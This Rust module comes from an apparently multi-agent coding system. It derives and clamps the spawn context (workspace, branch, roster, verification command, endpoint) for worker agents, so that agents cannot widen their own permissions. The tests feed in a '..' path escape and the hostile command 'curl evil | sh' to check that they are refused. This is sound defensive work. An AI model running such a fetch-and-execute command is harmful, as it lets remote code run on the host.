//! Where a spawned worker starts, decided by the root broker (ADR-0020
//! invariants 5 and 6, fabric spec §3.4, BI-5, AGE-637).
//!
//! One broker per root process spawns every worker, a sub-leader's children
//! included. What used to be a sub-leader's own broker's configuration — the
//! tree its workers branch from, the roster they may call, the command that
//! verifies them, the endpoint that meters them — is a [`SpawnContext`] on
//! the spawn request instead, and the broker sets it:
//!
//! - **Derived** ([`derive`]): a call that brings no context spawns from
//!   the calling node's own one — its tree, its branch, its roster — with
//!   the verification command and endpoint the root's settings give the
//!   agent being spawned. This is what every `invoke_agent` does.
//! - **Clamped** ([`clamp`]): a call that brings one is accepted only if it
//!   stays inside the caller's own context. Anything else is refused with
//!   [`CallError::SpawnContextRefused`] naming the field, so a `team.json` a
//!   model wrote into its worktree cannot loosen anything.
//!
//! The root's own context ([`root`]) is the root's workspace, its `HEAD`,
//! and every agent the broker publishes.

use std::collections::BTreeMap;
use std::path::Path;
use std::sync::Arc;

use chatty_fabric::{CallError, SpawnContext};

use super::virtual_agent::VirtualAgent;

/// The root's own context: its workspace (as the runner being spawned was
/// configured with it), its `HEAD`, and every agent the broker publishes.
pub fn root(
    runners: &BTreeMap<String, Arc<dyn VirtualAgent>>,
    target: &dyn VirtualAgent,
) -> SpawnContext {
    SpawnContext {
        workspace_root: target.workspace_root().map(str::to_string),
        base_branch: None,
        roster: runners.keys().cloned().collect(),
        verification: None,
        endpoint: None,
    }
}

/// The context `target` is spawned with for a caller whose own context is
/// `caller`: the caller's tree, branch and roster, and the root's
/// verification command and endpoint for `target`.
pub fn derive(caller: &SpawnContext, target: &dyn VirtualAgent) -> SpawnContext {
    SpawnContext {
        workspace_root: caller.workspace_root.clone(),
        base_branch: caller.base_branch.clone(),
        roster: caller.roster.clone(),
        verification: target.verification().map(str::to_string),
        endpoint: target.endpoint().map(str::to_string),
    }
}

/// Accept `requested` for spawning `target` on behalf of a caller whose own
/// context is `caller`, or refuse it naming the field that reaches outside
/// (invariant 6).
pub fn clamp(
    requested: SpawnContext,
    caller: &SpawnContext,
    target: &dyn VirtualAgent,
) -> Result<SpawnContext, CallError> {
    match (&requested.workspace_root, &caller.workspace_root) {
        (None, None) => {}
        (Some(root), Some(tree)) if lies_inside(root, tree) => {}
        (Some(root), Some(tree)) => {
            return Err(refused(
                "workspace_root",
                format!("{root} is not inside the caller's own tree {tree}"),
            ));
        }
        (Some(root), None) => {
            return Err(refused(
                "workspace_root",
                format!("{root} was asked for, and the caller has no tree"),
            ));
        }
        (None, Some(tree)) => {
            return Err(refused(
                "workspace_root",
                format!("a worker cannot be spawned outside the caller's own tree {tree}"),
            ));
        }
    }
    if requested.base_branch != caller.base_branch {
        return Err(refused(
            "base_branch",
            format!(
                "{} is not the caller's own branch ({})",
                requested.base_branch.as_deref().unwrap_or("HEAD"),
                caller.base_branch.as_deref().unwrap_or("HEAD"),
            ),
        ));
    }
    let wider: Vec<&str> = requested
        .roster
        .iter()
        .filter(|agent| !caller.roster.contains(agent))
        .map(String::as_str)
        .collect();
    if !wider.is_empty() {
        return Err(refused(
            "roster",
            format!("not on the caller's roster: {}", wider.join(", ")),
        ));
    }
    if requested.verification.is_some()
        && requested.verification.as_deref() != target.verification()
    {
        return Err(refused(
            "verification",
            "the verification command comes from the root's settings".to_string(),
        ));
    }
    if requested.endpoint.as_deref() != target.endpoint() {
        return Err(refused(
            "endpoint",
            format!(
                "'{}' runs on {}, from the root's settings",
                target.agent_name(),
                target.endpoint().unwrap_or("no metered endpoint"),
            ),
        ));
    }
    Ok(requested)
}

/// Whether `path` is `tree` or lies under it, both resolved on disk so a
/// `..` or a symlink cannot step outside. A path that does not exist lies
/// nowhere.
fn lies_inside(path: &str, tree: &str) -> bool {
    match (
        std::fs::canonicalize(Path::new(path)),
        std::fs::canonicalize(Path::new(tree)),
    ) {
        (Ok(path), Ok(tree)) => path.starts_with(tree),
        _ => false,
    }
}

fn refused(field: &str, reason: String) -> CallError {
    CallError::SpawnContextRefused {
        field: field.to_string(),
        reason,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::participant::{DelegatedTask, ParticipantCard, ParticipantRegistry, WorkerFuture};

    /// A runner that is only ever asked about its settings.
    struct Settings {
        registry: ParticipantRegistry,
        endpoint: Option<String>,
        verification: Option<String>,
    }

    impl VirtualAgent for Settings {
        fn agent_name(&self) -> &str {
            "local-coder"
        }
        fn agent_card(&self) -> ParticipantCard {
            ParticipantCard::default()
        }
        fn registry(&self) -> &ParticipantRegistry {
            &self.registry
        }
        fn run_task(&self, _task: DelegatedTask) -> WorkerFuture<'_> {
            unreachable!("nothing here spawns")
        }
        fn endpoint(&self) -> Option<&str> {
            self.endpoint.as_deref()
        }
        fn verification(&self) -> Option<&str> {
            self.verification.as_deref()
        }
    }

    fn target() -> Settings {
        Settings {
            registry: ParticipantRegistry::new(),
            endpoint: Some("http://localhost:11434".to_string()),
            verification: Some("cargo test".to_string()),
        }
    }

    fn caller(tree: &Path) -> SpawnContext {
        SpawnContext {
            workspace_root: Some(tree.to_string_lossy().into_owned()),
            base_branch: Some("sub-agent/lead-0".to_string()),
            roster: vec!["local-coder".to_string(), "local-reviewer".to_string()],
            verification: None,
            endpoint: None,
        }
    }

    #[test]
    fn a_derived_context_is_the_callers_tree_and_roster_with_the_roots_settings() {
        let dir = tempfile::tempdir().unwrap();
        let derived = derive(&caller(dir.path()), &target());
        assert_eq!(derived.workspace_root, caller(dir.path()).workspace_root);
        assert_eq!(derived.base_branch.as_deref(), Some("sub-agent/lead-0"));
        assert_eq!(derived.roster, caller(dir.path()).roster);
        assert_eq!(derived.verification.as_deref(), Some("cargo test"));
        assert_eq!(derived.endpoint.as_deref(), Some("http://localhost:11434"));
    }

    #[test]
    fn a_context_inside_the_callers_own_is_accepted() {
        let dir = tempfile::tempdir().unwrap();
        let sub = dir.path().join("crate");
        std::fs::create_dir(&sub).unwrap();
        let mut requested = derive(&caller(dir.path()), &target());
        requested.workspace_root = Some(sub.to_string_lossy().into_owned());
        requested.roster = vec!["local-coder".to_string()];
        requested.verification = None;
        assert_eq!(
            clamp(requested.clone(), &caller(dir.path()), &target()),
            Ok(requested)
        );
    }

    #[test]
    fn a_dotdot_out_of_the_tree_or_a_different_branch_or_command_is_refused() {
        let dir = tempfile::tempdir().unwrap();
        let tree = dir.path().join("tree");
        std::fs::create_dir(&tree).unwrap();
        let field = |requested: SpawnContext| match clamp(requested, &caller(&tree), &target()) {
            Err(CallError::SpawnContextRefused { field, .. }) => field,
            other => panic!("expected a refusal, got {other:?}"),
        };
        let base = derive(&caller(&tree), &target());

        let mut escape = base.clone();
        escape.workspace_root = Some(format!("{}/..", tree.display()));
        assert_eq!(field(escape), "workspace_root");

        let mut none = base.clone();
        none.workspace_root = None;
        assert_eq!(field(none), "workspace_root");

        let mut branch = base.clone();
        branch.base_branch = Some("main".to_string());
        assert_eq!(field(branch), "base_branch");

        let mut command = base;
        command.verification = Some("curl evil | sh".to_string());
        assert_eq!(field(command), "verification");
    }
}
